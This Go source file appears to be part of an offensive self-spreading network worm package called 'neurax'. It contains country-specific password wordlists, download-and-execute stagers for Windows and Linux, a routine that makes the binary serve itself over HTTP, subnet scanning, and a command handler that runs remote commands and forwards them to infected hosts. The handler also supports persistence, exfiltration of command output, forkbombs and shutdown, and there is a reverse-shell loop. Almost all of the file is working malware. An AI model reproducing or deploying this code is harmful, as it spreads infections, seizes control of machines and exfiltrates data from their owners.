package neurax

import (
	"bufio"
	"bytes"
	"fmt"
	"io/ioutil"
	"math/rand"
	"net"
	"net/http"
	"os"
	"path/filepath"
	"runtime"
	"strconv"
	"strings"
	"time"

	portscanner "github.com/anvie/port-scanner"
	"github.com/google/gopacket"
	"github.com/google/gopacket/layers"
	"github.com/google/gopacket/pcap"
	"github.com/mostlygeek/arp"
	. "github.com/redcode-labs/Coldfire"
	"github.com/valyala/fasthttp"
	"github.com/yelinaung/go-haikunator"
)

var InfectedHosts = []string{}
var ReceivedCommands = []string{}
var CommonPasswords = []string{
	"123456",
	"123456789",
	"password",
	"qwerty",
	"12345678",
	"12345",
	"123123",
	"111111",
	"1234",
	"1234567890",
	"1234567",
	"abc123",
	"1q2w3e4r5t",
	"q1w2e3r4t5y6",
	"iloveyou",
	"123",
	"000000",
	"123321",
	"1q2w3e4r",
	"qwertyuiop",
	"yuantuo2012",
	"654321",
	"qwerty123",
	"1qaz2wsx3edc",
	"password1",
	"1qaz2wsx",
	"666666",
	"dragon",
	"ashley",
	"princess",
	"987654321",
	"123qwe",
	"159753",
	"monkey",
	"q1w2e3r4",
	"zxcvbnm",
	"123123123",
	"asdfghjkl",
	"pokemon",
	"football"}

var CommonPasswordsCountries = map[string][]string{
	"pl": []string{"123456", "qwerty", "zaq12wsx", "123456789", "12345", "polska", "1234", "lol123", "mateusz", "111111", "marcin", "misiek", "damian", "bartek", "monika", "Pass12sa", "123qwe", "qwe123", "michal", "akrokis123", "patryk", "kacper", "maciek", "karolina", "123123", "12345678", "1qaz2wsx", "piotrek", "qwerty123", "daniel", "zxcvbnm", "lukasz", "samsung", "qazwsx", "golfcourse", "qwertyuiop", "adrian", "lolek123", "qwerty1", "password", "1234567890", "1234567", "mateusz1", "yOp7s55", "dupa", "agnieszka", "komputer", "myszka", "1q2w3e4r", "kasia", "kamil1", "polska1", "natalia", "matrix", "kamil123", "kochanie", "master", "1q2w3e", "madzia", "dragon", "000000", "bartek1", "aaaaaa", "klaudia", "666666", "kamil", "dominik", "1qazxsw2", "1111", "kasia1", "123321", "asdasd", "wojtek", "paulina", "szymon", "niunia", "polska123", "ziomek", "dupa123", "zaqwsx", "marcin1", "robert", "haslo", "misiaczek", "1234qwer", "abc123", "sebastian", "haslo1", "dominika", "dawid123", "mariusz", "dawid1", "michal1", "barcelona", "weronika", "kosama", "kuba123", "patrycja", "maniek", "justyna", "kamila", "pokemon", "1q2w3e4r5t", "pawel1", "konrad", "Groupd2013", "damian1", "tomek1", "komputer1", "widzew", "kamilek", "haslo123", "aaaa", "magda", "qweasd", "tomek", "marta", "piotrek1", "asdfgh", "11111", "asd123", "asdfghjkl", "sylwia", "kochamcie", "dawid", "654321", "ewelina", "wiktoria", "pakistan", "kocham", "dawidek", "patryk1", "lolek", "misiek1", "kotek", "q1w2e3r4", "123456a", "monika1", "teg4ka1P5U", "lolek1", "sandra", "pawel", "polska12", "adidas", "maciek1", "andrzej", "87654321", "qazxsw", "przemek", "kacper1"},
	"hu": []string{"123456", "63245009", "faszfej1", "123456789", "84569280", "12345", "jelszo", "83773049", "asdasd", "29662012", "attila", "12345678", "qwertz", "000000", "asd123", "7732844", "111111", "zolika", "liba01", "tomika", "52145874", "macska", "lacika", "1234", "asdfgh", "danika", "samsung", "tigris", "szerelem", "16912194", "8933959", "csemege6", "password", "eszter", "szeretlek", "killer", "macika", "666666", "sarkany10", "barcelona", "malacka", "yamahar1", "petike", "dominik", "nemtudom", "asdasdasd", "garfield", "ronaldo", "dragon", "5324353", "patrik", "1234567", "ferrari", "unqnkmol03", "valami", "levente", "gabika", "janika", "fradika", "nemtom", "viktor", "cicamica", "balazs", "csillag", "Predator", "kicsim", "dominika", "roland", "juventus", "sanyika", "arsenal", "martin", "zsolti", "delfin", "farkas", "nyuszi", "mazsola", "q1w2e3r4", "bence", "nincsen", "012345", "manoka", "bilbao1", "1q2w3e4r", "almafa", "mester", "monika", "aaaaaa", "realmadrid", "citrom", "budapest", "csabika", "genius", "856169", "asdasd123", "nhjaqhoc43", "viktoria", "suzuki", "kecske", "madrid", "melinda", "robika", "adidas", "qwert", "matrix", "pamacs", "diablo", "macilaci", "freemail", "11111", "xxxxxx", "starwars", "654321", "andrea", "csilla", "eminem", "magyar", "vivien", "balint", "chelsea", "tappancs", "katica", "titkos", "slipknot", "Thomas92", "latoska", "manocska", "55555", "00000", "internet", "narancs", "erikbaba", "szabolcs", "yamaha", "fradi", "asdfghjkl", "lilike", "sziszi", "katalin", "ildiko", "abc123", "daniel", "david", "kriszti", "lofasz", "rebeka", "zoltan", "nikolett", "szilvi", "norbert"},
	"fr": []string{"123456", "123456789", "1234561", "azerty", "1234567891", "qwerty", "123", "azertyuiop", "marseille", "doudou", "loulou", "12345", "000000", "123451", "password", "12345678", "1234", "soleil", "nicolas", "chouchou", "1234567", "bonjour", "111111", "iloveyou1", "123123", "thomas", "camille", "motdepasse", "coucou", "iloveyou", "12345671", "julien", "jetaime", "naruto", "maxime", "alexandre", "chocolat", "1234567890", "0000", "dragon", "portugal", "pierre", "00000", "isabelle", "antoine", "marine", "oceane", "romain", "654321", "mar", "sandrine", "football", "olivier", "caroline", "nathalie", "vincent", "pompier", "123456781", "celine", "valentin", "caramel", "wxcvbn", "Status", "azerty123", "boubou", "maison", "elodie", "sophie", "anthony", "quentin", "aze", "benjamin", "aurelie", "vanille", "audrey", "alexis", "clement", "emilie", "cheval", "chipie", "666666", "0123456789", "marion", "987654321", "pauline", "princesse", "laurent", "pokemon", "amandine", "morgane", "12345678901", "louloute", "NULL", "melanie", "secret", "sebastien", "stephane", "159753", "6543211", "florian", "mathilde", "france", "papillon", "mohamed", "michel", "mathieu", "voiture", "frederic", "nounours", "qwerty1", "arthur", "junior", "jerome", "aaaaaa", "philippe", "amour", "guillaume", "tintin", "qwertyuiop", "bhf", "nathan", "jordan", "scorpion", "bou", "poisson", "lolita", "melissa", "justine", "virginie", "charlotte", "juliette", "toulouse", "patrick", "vanessa", "sandra", "sabrina", "laetitia", "password1", "mamour", "789456", "cedric", "jeremy", "daniel", "jonathan", "1111111", "damien", "121212", "noisette", "nounou", "delphine"},
	"ru": []string{"123456", "123456789", "qwerty", "1q2w3e4r5t", "qwertyuiop", "12345678", "111111", "1q2w3e4r", "1234567890", "123123", "qwerty123", "123321", "1234567", "1qaz2wsx", "1234qwer", "12345", "qweasdzxc", "qazwsxedc", "666666", "000000", "123qwe", "7777777", "1q2w3e", "gfhjkm", "qazwsx", "zxcvbnm", "123456789a", "123qweasdzxc", "1q2w3e4r5t6y", "q1w2e3r4", "qwe123", "654321", "12345qwert", "qwer1234", "555555", "159753", "asdfghjkl", "qwertyui", "q1w2e3r4t5", "123456789q", "123123123", "121212", "123qweasd", "12qwaszx", "1qazxsw2", "987654321", "1234", "1qaz2wsx3edc", "123qwe123", "112233", "password", "tresd5", "777777", "crossfire", "ghbdtn", "11111111", "123456a", "zxcvbn", "123654", "123456q", "qwerty12345", "qazwsx123", "4815162342", "q1w2e3r4t5y6", "12344321", "qweasd", "222222", "159357", "1234554321", "1111111", "0987654321", "asdfgh", "qwerty123456", "131313", "asdasd", "samsung", "nikita", "qweqwe", "q1w2e3", "12345q", "qwerty12", "qqqqqq", "789456123", "qwerty1", "qwaszx", "88888888", "qweasdzxc123", "qazwsxedcrfv", "12345678910", "999999", "12345678a", "1029384756", "123456789z", "qwertyu", "147258369", "qwert12345", "1234567q", "123456qwerty", "qazxswedc", "789456", "stalker", "333333", "1111", "qwerasdf", "1234567890q", "qazwsxedc123", "nastya", "qazxsw", "12345678q", "11223344", "1234567a", "12345a", "fyfcnfcbz", "iloveyou", "qwe123qwe", "fktrcfylh", "asdfghjk", "marina", "12341234", "qwert", "1q2w3e4r5t6y7u", "vfrcbv", "1q2w3e4r5", "qwertyqwerty", "zaq12wsx", "fylhtq", "101010", "1qa2ws3ed", "master", "kifj9n7bfu", "11111", "123654789", "q123q123", "vfhbyf", "123qwe123qwe", "qweasd123", "1111111111", "killer", "111222", "aaaaaa", "sergey", "010203", "zzzzzz", "123321q", "888888", "12345qwe", "secret666", "87654321", "147852369", "zxc123"},
	"th": []string{"123456", "123456789", "1234", "12345678", "1234567890", "password", "111111", "1234567", "999999", "999999999", "987654321", "0123456789", "12345", "0987654321", "000000", "654321", "221225", "112233", "123123", "asd123456", "1212312121", "1111111111", "555555", "0000000000", "11111111", "16859537", "44307644", "159753", "9876543210", "lovelove", "thailand", "123456789a", "666666", "789456123", "jack16599", "zxcvbnm", "88888888", "147258369", "1122334455", "25242524", "thai123", "123456789za", "9999999999", "11223344", "12341234", "741852963", "7777777", "888888", "987654", "0123456", "00000000", "222222", "iloveyou", "liverpool", "123456a", "147852369", "252525", "456789", "0884351966", "1475", "99999999", "212224", "25232523", "789456", "111111111", "123123123", "159357", "loveyou", "25262526", "55555", "zqq7784", "123456za", "25219621", "444444", "Bapichat123456", "123456789z", "1q2w3e4r", "25222522", "147852", "212224236", "87654321", "2222222222", "2522", "za123456", "012345", "10081997TICK", "1234512345", "25252525", "2520", "25292529", "333333", "a123456789", "25162516", "55555555", "zxcvbn", "0935910995", "123321", "12345678910", "123789", "1qaz2wsx", "25362536", "27112537", "7654321", "Bas3bal!", "Mater555", "joeyboy2012", "mth99007806", "012524PTC", "101010Bee", "121212", "1234567891", "131313", "25202520", "25272527", "25302530", "313326339", "3571138", "44444444", "5555555", "777777", "963852741", "abc123", "dragon", "qazwsx", "1111", "111222", "111222333", "123654", "135790", "147258", "25132513", "2514", "2516", "25182518", "5555555555", "963852", "ann23102521", "pop2512", "qwerty", "tent91257", "246810", "456123", "LOVE0909", "a123456", "asdfghjkl", "0873029756", "098765", "11111", "12344321", "140136"},
	"es": []string{"123456", "123456789", "12345678", "password", "mustang73", "1234abcd", "1234", "12345", "america", "1234567", "gallito", "qwerty", "alejandro", "pokemon", "carlos", "mexico", "111111", "daniel", "123456qwe", "1234567890", "chivas", "123123", "dragon", "alejandra", "fernando", "000000", "654321", "estrella", "naruto", "andrea", "manuel", "princesa", "caca", "superman", "cruzazul", "666666", "fernanda", "eduardo", "monica", "abc123", "adriana", "daniela", "javier", "CFE2015", "miguel", "ricardo", "rental", "camila", "carolina", "sard", "claudia", "valeria", "alberto", "antonio", "mariana", "sebastian", "corazon", "contraseña", "roberto", "sandra", "chocolate", "123qwe", "hola", "jessica", "martinez", "furuyanomori", "lupita", "metallica", "arturo", "santiago", "123456a", "america1", "bonita", "gabriela", "mauricio", "BRITISH2015", "master", "joseluis", "karina", "angelica", "elizabeth", "sergio", "victor", "123abc", "brenda", "francisco", "musica", "spiderman", "delfin", "hernandez", "aguilas", "andres", "angelito", "pancho", "ximena", "zxcvbnm", "sakura", "flores", "gabriel", "carlitos", "xbox360", "barcelona", "adrian", "isabel", "junior", "qwertyuiop", "121212", "gatito", "killer", "veronica", "159753", "1q2w3e4r", "emiliano", "escorpion", "hector", "lorena", "paulina", "pikachu", "chavez", "liliana", "marisol", "pelusa", "angeles", "lol123", "minecraft", "nirvana", "patito", "armando", "987654321", "leonardo", "pamela", "101010", "aguila", "alexis", "asdf", "gerardo", "555555", "castillo", "cristo", "pollito", "angel", "amorcito", "carmen", "alfredo", "cristina", "familia", "1qaz2wsx", "amores", "conejo", "7777777"},
	"de": []string{"123456", "123456789", "12345678", "passwort", "qwerty", "hallo123", "12345", "1234", "hallo", "1234567", "huhbbhzu78", "password", "ficken", "killer", "1q2w3e4r", "qwertz", "lol123", "schalke04", "master", "1234567890", "dennis", "daniel", "alexander", "111111", "fussball", "schatz", "arschloch", "123123", "1234561", "schalke", "michael", "starwars", "computer", "werder", "abc123", "wasser", "andreas", "florian", "internet", "michelle", "sommer", "berlin", "000000", "asdfgh", "sandra", "pokemon", "marcel", "Passwort", "thomas", "hamburg", "dragon", "christian", "bayern", "geheim", "handball", "dortmund", "666666", "ichliebedich", "sebastian", "patrick", "tobias", "nicole", "martin", "bushido", "sascha", "stefan", "asdasd", "fabian", "dominik", "1q2w3e4r5t", "jasmin", "justin", "logitech", "eminem", "benjamin", "maximilian", "sabrina", "yxcvbnm", "samsung", "SKIFFY", "1234qwer", "markus", "schule", "hallo1", "pascal", "merlin", "nadine", "1234567891", "1qay2wsx", "snoopy", "moritz", "medion", "lollol", "playboy", "123qwe", "vanessa", "mercedes", "matrix", "philipp", "oliver", "wertz123", "sunshine", "hurensohn", "Hallo123", "borussia", "passwort1", "aaaaaa", "schatzi", "sonnenschein", "blabla", "info", "werner", "fcbayern", "charly", "q1w2e3r4", "marvin", "jennifer", "niklas", "asdf1234", "iloveyou", "julian", "asdf", "qwer1234", "andrea", "melanie", "porsche", "kennwort", "johannes", "deutschland", "987654321", "123321", "infoinfo", "sternchen", "jessica", "1q2w3e", "sabine", "1111", "654321", "Status", "hamster", "matthias", "slipknot", "onkelz", "vergessen", "asdfghjkl", "steffi", "minecraft", "manuel", "fickdich", "asd123"},
	"se": []string{"123456", "okthandha", "webhompass", "hejsan", "hejsan123", "hejhej", "lol123", "123456789", "qwerty", "guntles99", "hejhej123", "123123", "bajskorv", "abc123", "mamma123", "password", "hej123", "sommar", "dinmamma", "helena", "12345", "kalleanka", "12345678", "malin", "6435", "7546", "3182", "5324", "8657", "alexander", "fotboll", "qwe123", "123qwe", "hemligt", "9768", "asdasd", "rasmus", "lolipop", "kalle123", "1234", "anders", "mamma", "4293", "hammarby", "111111", "daniel", "killer", "bajs123", "sverige", "helene", "starwars", "blomma", "helen", "qwerty123", "123qweasd", "cocacola", "hejhej1", "helloo", "1q2w3e4r", "margareta", "asdasd123", "lollol", "andreas", "asd123", "hejhejhej", "godis", "mamma1", "sweden", "amanda", "hanna", "bajsbajs", "oliver", "johanna", "martin", "william", "master", "8757", "6535", "smulan", "dragon", "1234567", "3282", "katten", "qwer1234", "trustno1", "wickedwitch", "apa123", "dinmamma1", "121212", "andersson", "linnea", "samsung", "jakjak", "bajs", "jessica", "hampus", "123abc", "2971", "4313", "123123123", "elisabeth", "gnaget", "internet", "1qaz2wsx", "666666", "fredrik", "mormor", "5424", "marianne", "sebastian", "marcus", "frida", "gustav", "barnsemester", "mikael", "1868", "asdfasdf", "asdqwe123", "123321", "dennis", "findus", "handboll", "kungen", "stockholm", "zxcvbnm", "neger123", "mammamia", "2871", "lolipop1", "tstpsw", "emelie", "morris", "2879", "johan", "losenord", "metallica", "1q2w3e", "innebandy", "pokemon", "silver", "lilleman", "mattias", "7646", "kalle", "apelsin", "hejsan1", "112233", "charlie", "dinmamma123", "nisse"},
	"hi": []string{"123456", "Indya123", "123456789", "1234567Qq", "password", "12345", "12345678", "indya123D", "1234", "10577", "krishna", "zxcvbnm", "1234567", "indian", "111111", "sairam", "computer", "qwerty", "iloveyou", "1qaz", "123123", "1234567890", "abc123", "ganesh", "saibaba", "sachin", "mother", "abcd1234", "india123", "lakshmi", "welcome", "654321", "aicte@123", "iloveu", "786786", "expert12", "friends", "tabasum786", "sweety", "abcdef", "jaimatadi", "rajesh", "omsairam", "anjali", "priyanka", "hanuman", "7024371253", "police123", "000000", "sanjay", "samsung", "ramesh", "suresh", "deepak", "aaaaaa", "balaji", "asdfgh", "friend", "hariom", "manish", "aditya", "sandeep", "Password", "asdfghjkl", "success", "lovely", "cricket", "abhishek", "prasad", "cutecatvip", "jasmine", "flower", "prakash", "engineer", "999999", "poonam", "sandhya", "sharma", "prince", "666666", "987654321", "master", "pass2512", "santosh", "venkat", "archana", "manisha", "never", "vijaya", "chennai", "kumar", "simran", "rashmi", "karthik", "ashish", "qwertyuiop", "asdf1234", "mahesh", "rakesh", "sriram", "qwer1234", "internet", "passion", "khushi", "Mango123", "sweetheart", "vishal", "kannan", "waheguru", "143143", "creative", "chandra", "bharat", "naveen", "chinnu", "praveen", "srinivas", "kavitha", "babynaaz123", "pradeep", "555555", "aaaaaaaa", "indya123", "welcome123", "ganesha", "ramram", "dinesh", "sunita", "bangalore", "admin123", "preeti", "radhika", "bismillah", "test", "mechanical", "nikhil", "redrose", "yamaha", "secret", "shilpa", "loveyou", "anitha", "chinna", "loveme", "kalpana", "pankaj", "superman", "vijay", "doctor", "vishnu"},
}

var LangExecutors = map[string]string{
	"python_os":         `import os; os.system("COMMAND")`,
	"python_subprocess": `import subprocess; subprocess.call("COMMAND", shell=True)`,
	"javascript":        `var shl = WScript.CreateObject("WScript.Shell"); shl.Run("COMMAND");`,
	"php":               `exec("COMMAND")`,
	"ruby":              "`COMMAND`",
	"perl":              `system("COMMAND");`,
	"lua":               `os.execute("COMMAND")`,
	"mysql":             `\! COMMAND`,
	"redis":             `eval "os.execute('COMMAND')"`,
}

type __N struct {
	Stager                   string
	StagerSudo               bool
	StagerRetry              int
	Port                     int
	CommPort                 int
	CommProto                string
	LocalIp                  string
	Path                     string
	FileName                 string
	Platform                 string
	Cidr                     string
	ScanPassive              bool
	ScanActive               bool
	ScanActiveTimeout        int
	ScanPassiveTimeout       int
	ScanPassiveIface         string
	ScanPassiveAll           bool
	ScanPassiveNoArp         bool
	ScanFast                 bool
	ScanShaker               bool
	ScanShakerPorts          []int
	ScanFirst                []string
	ScanArpCache             bool
	ScanThreads              int
	ScanFullRange            bool
	ScanGatewayFirst         bool
	ScanFirstOnly            bool
	Base64                   bool
	ScanRequiredPort         int
	Verbose                  bool
	Remove                   bool
	ScanInterval             string
	ScanHostInterval         string
	ReverseListener          string
	ReverseProto             string
	PreventReexec            bool
	ExfilAddr                string
	WordlistExpand           bool
	WordlistCommon           bool
	WordlistCommonNum        int
	WordlistCommonCountries  map[string]int
	WordlistMutators         []string
	WordlistPermuteNum       int
	WordlistPermuteSeparator string
	WordlistShuffle          bool
	AllocNum                 int
	Blacklist                []string
	FastHTTP                 bool
	Debug                    bool
}

var N = __N{
	Stager:                   "random",
	StagerSudo:               false,
	StagerRetry:              0,
	Port:                     6741, //coldfire.RandomInt(2222, 9999),
	CommPort:                 7777,
	CommProto:                "udp",
	ScanRequiredPort:         0,
	LocalIp:                  GetLocalIp(),
	Path:                     "random",
	FileName:                 "random",
	Platform:                 runtime.GOOS,
	Cidr:                     GetLocalIp() + "/24",
	ScanPassive:              false,
	ScanActive:               true,
	ScanActiveTimeout:        2,
	ScanPassiveTimeout:       50,
	ScanPassiveIface:         "default",
	ScanPassiveAll:           false,
	ScanPassiveNoArp:         false,
	ScanFast:                 false,
	ScanShaker:               false,
	ScanShakerPorts:          []int{21, 80},
	ScanFirst:                []string{},
	ScanArpCache:             false,
	ScanThreads:              10,
	ScanFullRange:            false,
	ScanGatewayFirst:         false,
	ScanFirstOnly:            false,
	Base64:                   false,
	Verbose:                  false,
	Remove:                   false,
	ScanInterval:             "2m",
	ScanHostInterval:         "none",
	ReverseListener:          "none",
	ReverseProto:             "udp",
	PreventReexec:            true,
	ExfilAddr:                "none",
	WordlistExpand:           false,
	WordlistCommon:           false,
	WordlistCommonNum:        len(CommonPasswords),
	WordlistCommonCountries:  map[string]int{},
	WordlistMutators:         []string{"single_upper", "encapsule"},
	WordlistPermuteNum:       2,
	WordlistPermuteSeparator: "-",
	WordlistShuffle:          false,
	AllocNum:                 5,
	Blacklist:                []string{},
	FastHTTP:                 false,
	Debug:                    false,
}

//Verbose error printing
func ReportError(message string, e error) {
	if e != nil && N.Verbose {
		fmt.Printf("ERROR %s: %s", message, e.Error())
		if N.Remove {
			os.Remove(os.Args[0])
		}
	}
}

func NeuraxStagerLang(name string) string {
	return strings.Replace(LangExecutors[name], "COMMAND", NeuraxStager(), -1)
}

//Returns a command stager that downloads and executes current binary
func NeuraxStager() string {
	stagers := [][]string{}
	stager := []string{}
	paths := []string{}
	b64_decoder := ""
	sudo := ""
	stager_retry := strconv.Itoa(N.StagerRetry + 1)
	windows_stagers := [][]string{
		[]string{"certutil", `for /l %%N in (1 1 RETRY) do certutil.exe -urlcache -split -f URL && B64 SAVE_PATH\FILENAME`},
		[]string{"powershell", `for /l %%N in (1 1 RETRY) do Invoke-WebRequest URL/FILENAME -O SAVE_PATH\FILENAME && B64 SAVE_PATH\FILENAME`},
		[]string{"bitsadmin", `for /l %%N in (1 1 RETRY) do bitsadmin /transfer update /priority high URL SAVE_PATH\FILENAME && B64 SAVE_PATH\FILENAME`},
	}
	linux_stagers := [][]string{
		[]string{"wget", `for i in {1..RETRY}; do SUDO wget -O SAVE_PATH/FILENAME URL; SUDO B64 chmod +x SAVE_PATH/FILENAME; SUDO SAVE_PATH./FILENAME; done`},
		[]string{"curl", `for i in {1..RETRY}; do SUDO curl URL/FILENAME > SAVE_PATH/FILENAME; SUDO B64 chmod +x SAVE_PATH/FILENAME; SUDO SAVE_PATH./FILENAME; done`},
	}
	linux_save_paths := []string{"/tmp", "/lib", "~",
		"/etc", "/usr", "/usr/share"}
	windows_save_paths := []string{`%SYSTEMDRIVE%\$recycle.bin\`, `%ALLUSERSAPPDATA%\MicrosoftHelp\`}
	switch N.Platform {
	case "windows":
		stagers = windows_stagers
		paths = windows_save_paths
		if N.Base64 {
			b64_decoder = "certutil -decode SAVE_PATH/FILENAME SAVE_PATH/FILENAME;"
		}
	case "linux", "darwin":
		stagers = linux_stagers
		paths = linux_save_paths
		if N.Base64 {
			b64_decoder = "cat SAVE_PATH/FILENAME|base64 -d > SAVE_PATH/FILENAME;"
		}
	}
	if N.Stager == "random" {
		stager = RandomSelectStrNested(stagers)
	} else {
		for s := range stagers {
			st := stagers[s]
			if st[0] == N.Stager {
				stager = st
			}
		}
	}
	selected_stager_command := stager[1]
	if N.Stager == "chain" {
		chained_commands := []string{}
		for s := range stagers {
			st := stagers[s]
			chained_commands = append(chained_commands, st[1])
		}
		separator := ";"
		if runtime.GOOS == "windows" {
			separator = "&&"
		}
		selected_stager_command = strings.Join(chained_commands, " "+separator+" ")
	}
	if N.Path == "random" {
		N.Path = RandomSelectStr(paths)
	}
	if N.FileName == "random" {
		N.FileName = RandomString(RandomInt(4, 10))
	}
	if N.FileName == "random" && N.Platform == "windows" {
		N.FileName += ".exe"
	}
	if N.StagerSudo {
		sudo = "sudo"
	}
	url := fmt.Sprintf("http://%s:%d/%s", N.LocalIp, N.Port, N.FileName)
	selected_stager_command = strings.Replace(selected_stager_command, "URL", url, -1)
	selected_stager_command = strings.Replace(selected_stager_command, "FILENAME", N.FileName, -1)
	selected_stager_command = strings.Replace(selected_stager_command, "SAVE_PATH", N.Path, -1)
	selected_stager_command = strings.Replace(selected_stager_command, "B64", b64_decoder, -1)
	selected_stager_command = strings.Replace(selected_stager_command, "SUDO", sudo, -1)
	selected_stager_command = strings.Replace(selected_stager_command, "RETRY", stager_retry, -1)
	NeuraxDebug("Created command stager: " + selected_stager_command)
	return selected_stager_command
}

//Binary serves itself
func NeuraxServer() {
	/*if N.prevent_reinfect {
		go net.Listen("tcp", "0.0.0.0:"+N.knock_port)
	}*/
	data, _ := ioutil.ReadFile(os.Args[0])
	if N.Base64 {
		data = []byte(B64E(string(data)))
	}
	addr := fmt.Sprintf(":%d", N.Port)
	go http.ListenAndServe(addr, http.HandlerFunc(func(rw http.ResponseWriter, r *http.Request) {
		http.ServeContent(rw, r, N.FileName, time.Now(), bytes.NewReader(data))
	}))
}

//Returns true if host is active
func IsHostActive(target string) bool {
	if Contains(N.Blacklist, target) {
		return false
	}
	if N.ScanShaker {
		for _, port := range N.ScanShakerPorts {
			timeout := time.Duration(N.ScanActiveTimeout) * time.Second
			port_str := strconv.Itoa(port)
			_, err := net.DialTimeout("tcp", target+port_str, timeout)
			if err == nil {
				NeuraxDebug("Found active host: " + target)
				return true
			}
		}
	} else {
		first := 19
		last := 200
		if N.ScanFullRange {
			last = 65535
		}
		if N.ScanFast {
			N.ScanActiveTimeout = 2
			N.ScanThreads = 20
			first = 21
			last = 81
		}
		ps := portscanner.NewPortScanner(target, time.Duration(N.ScanActiveTimeout)*time.Second, N.ScanThreads)
		opened_ports := ps.GetOpenedPort(first, last)
		if len(opened_ports) != 0 {
			if N.ScanRequiredPort == 0 {
				NeuraxDebug("Found active host: " + target)
				return true
			} else {
				if PortscanSingle(target, N.ScanRequiredPort) {
					NeuraxDebug("Found active host: " + target)
					return true
				}
			}
		}
	}
	return false
}

//Returns true if host is infected
func IsHostInfected(target string) bool {
	if Contains(N.Blacklist, target) {
		return false
	}
	if Contains(InfectedHosts, target) {
		return true
	}
	target_url := fmt.Sprintf("http://%s:%d/", target, N.Port)
	if N.FastHTTP {
		req := fasthttp.AcquireRequest()
		defer fasthttp.ReleaseRequest(req)
		req.SetRequestURI(target_url)
		resp := fasthttp.AcquireResponse()
		defer fasthttp.ReleaseResponse(resp)
		err := fasthttp.Do(req, resp)
		if err != nil {
			return false
		}
		if resp.StatusCode() == fasthttp.StatusOK {
			InfectedHosts = append(InfectedHosts, target)
			InfectedHosts = RemoveFromSlice(InfectedHosts, N.LocalIp)
			NeuraxDebug("Found infected host: " + target)
			return true
		}
	} else {
		rsp, err := http.Get(target_url)
		if err != nil {
			return false
		}
		if rsp.StatusCode == 200 {
			InfectedHosts = append(InfectedHosts, target)
			InfectedHosts = RemoveFromSlice(InfectedHosts, N.LocalIp)
			NeuraxDebug("Found infected host: " + target)
			return true
		}
		return false
	}
	return false
}

/*func handle_revshell_conn() {
	message, _ := bufio.NewReader(conn).ReadString('\n')
	out, err := exec.Command(strings.TrimSuffix(message, "\n")).Output()
	if err != nil {
		fmt.Fprintf(conn, "%s\n", err)
	}
	fmt.Fprintf(conn, "%s\n", out)
}

func NeuraxSignal(addr string) {
	conn, err := net.Dial("udp", addr)
	ReportError("Cannot establish reverse UDP conn", err)
	for {
		handle_revshell_conn(conn)
	}
}*/

func handle_command(cmd string) {
	if N.PreventReexec {
		if Contains(ReceivedCommands, cmd) {
			return
		}
		ReceivedCommands = append(ReceivedCommands, cmd)
	}
	DataSender := SendDataUDP
	forwarded_preamble := ""
	if N.CommProto == "tcp" {
		DataSender = SendDataTCP
	}
	preamble := strings.Fields(cmd)[0]
	can_execute := true
	no_forward := false
	if strings.Contains(preamble, "e") {
		if !IsRoot() {
			can_execute = false
		}
	}
	if strings.Contains(preamble, "k") {
		forwarded_preamble = preamble
	}
	if strings.Contains(preamble, ":") {
		cmd = strings.Join(strings.Fields(cmd)[1:], " ")
		if strings.Contains(preamble, "s") {
			time.Sleep(time.Duration(RandomInt(1, 5)))
		}
		if strings.Contains(preamble, "p") {
			AddPersistentCommand(cmd)
		}
		if strings.Contains(preamble, "x") && can_execute {
			out, err := CmdOut(cmd)
			if err != nil {
				if strings.Contains(preamble, "!") {
					no_forward = true
				}
				out += ": " + err.Error()
			}
			if strings.Contains(preamble, "d") {
				fmt.Println(out)
			}
			if strings.Contains(preamble, "v") {
				host := strings.Split(N.ExfilAddr, ":")[0]
				port := strings.Split(N.ExfilAddr, ":")[1]
				p, _ := strconv.Atoi(port)
				SendDataTCP(host, p, out)
			}
			if strings.Contains(preamble, "l") && can_execute {
				for {
					CmdRun(cmd)
				}
			}
		}
		if strings.Contains(preamble, "a") && !no_forward {
			fmt.Println(InfectedHosts)
			for _, host := range InfectedHosts {
				err := DataSender(host, N.CommPort, fmt.Sprintf("%s %s", forwarded_preamble, cmd))
				ReportError("Cannot send command", err)
				if strings.Contains(preamble, "o") && !strings.Contains(preamble, "m") {
					break
				}
			}
		}
		if strings.Contains(preamble, "r") {
			Remove()
			os.Exit(0)
		}
		if strings.Contains(preamble, "q") {
			Shutdown()
		}
		if strings.Contains(preamble, "f") {
			Forkbomb()
		}
	} else {
		if cmd == "purge" {
			NeuraxPurgeSelf()
		}
		CmdOut(cmd)
	}
}

//Opens port (.CommPort) and waits for commands
func NeuraxOpenComm() {
	l, err := net.Listen(N.CommProto, "0.0.0.0:"+strconv.Itoa(N.CommPort))
	ReportError("Comm listen error", err)
	for {
		conn, err := l.Accept()
		ReportError("Comm accept error", err)
		buff := make([]byte, 1024)
		len, _ := conn.Read(buff)
		cmd := string(buff[:len-1])
		NeuraxDebug("Received command: " + cmd)
		go handle_command(cmd)
		conn.Close()
	}
}

//Launches a reverse shell. Each received command is passed to handle_command()
func NeuraxReverse() {
	conn, _ := net.Dial(N.ReverseProto, N.ReverseListener)
	for {
		command, err := bufio.NewReader(conn).ReadString('\n')
		if err != nil {
			break
		}
		command = strings.TrimSuffix(command, "\n")
		go handle_command(command)
	}
}

func neurax_scan_passive_single_iface(f func(string), iface string) {
	var snapshot_len int32 = 1024
	timeout := time.Duration(N.ScanPassiveTimeout) * time.Second
	if N.ScanFast {
		timeout = 50 * time.Second
	}
	handler, err := pcap.OpenLive(iface, snapshot_len, false, timeout)
	ReportError("Cannot open device", err)
	if !N.ScanPassiveNoArp {
		handler.SetBPFFilter("arp")
	}
	defer handler.Close()
	packetSource := gopacket.NewPacketSource(handler, handler.LinkType())
	for packet := range packetSource.Packets() {
		ip_layer := packet.Layer(layers.LayerTypeIPv4)
		if ip_layer != nil {
			ip, _ := ip_layer.(*layers.IPv4)
			source := fmt.Sprintf("%s", ip.SrcIP)
			destination := fmt.Sprintf("%s", ip.DstIP)
			if source != N.LocalIp && !IsHostInfected(source) && source != "255.255.255.255" {
				go f(source)
			}
			if destination != N.LocalIp && !IsHostInfected(destination) && destination != "255.255.255.255" {
				go f(destination)
			}
		}
	}
}

func neurax_scan_passive(f func(string)) {
	current_iface, _ := Iface()
	ifaces_to_use := []string{current_iface}
	if N.ScanPassiveIface != "default" {
		ifaces_to_use = []string{N.ScanPassiveIface}
	}
	device_names := []string{}
	devices, err := pcap.FindAllDevs()
	for _, dev := range devices {
		device_names = append(device_names, dev.Name)
	}
	ReportError("Cannot obtain network interfaces", err)
	if N.ScanPassiveAll {
		ifaces_to_use = append(ifaces_to_use, device_names...)
	}
	for _, device := range ifaces_to_use {
		go neurax_scan_passive_single_iface(f, device)
	}
}

